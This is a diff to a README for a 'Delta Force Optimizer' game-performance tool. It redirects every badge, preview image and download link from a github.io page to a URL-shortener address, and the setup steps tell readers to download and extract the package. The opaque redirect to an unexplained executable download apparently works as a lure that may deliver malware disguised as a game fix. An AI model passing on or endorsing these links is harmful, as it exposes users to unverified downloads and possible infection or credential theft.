@@ -10,28 +10,28 @@ It is designed around the two main Delta Force experiences — large-scale **War
 
 ## Quick Access
 
-[![Delta Force](https://img.shields.io/badge/Delta%20Force-Optimizer-17b978?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Lag](https://img.shields.io/badge/Lag-Fix-2ea043?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Stutter](https://img.shields.io/badge/Stutter-Repair-8250df?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Delta Force](https://img.shields.io/badge/Delta%20Force-Optimizer-17b978?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Lag](https://img.shields.io/badge/Lag-Fix-2ea043?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Stutter](https://img.shields.io/badge/Stutter-Repair-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Delta Force Optimizer](https://idleobstacle.github.io/)**
+➡️ **[Download Delta Force Optimizer](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Delta Force performance optimizer](assets/delta-force-optimizer-preview.png)](https://idleobstacle.github.io/)
+[![Delta Force performance optimizer](assets/delta-force-optimizer-preview.png)](https://flyn.co/17yeN7/)
 
 ### Optimizer Dashboard
 
-[![Delta Force optimizer dashboard](assets/delta-force-optimizer-dashboard.png)](https://idleobstacle.github.io/)
+[![Delta Force optimizer dashboard](assets/delta-force-optimizer-dashboard.png)](https://flyn.co/17yeN7/)
 
 > Preview values are illustrative. Actual system load, temperatures, latency, smoothness, and stability depend on hardware, drivers, network conditions, graphics settings, background software, and the current Delta Force build.
 
@@ -200,7 +200,7 @@ For Operations, prioritize:
 
 1. Download the current package:
 
-   **[Download Delta Force Optimizer](https://idleobstacle.github.io/)**
+   **[Download Delta Force Optimizer](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Close Delta Force before applying configuration changes.
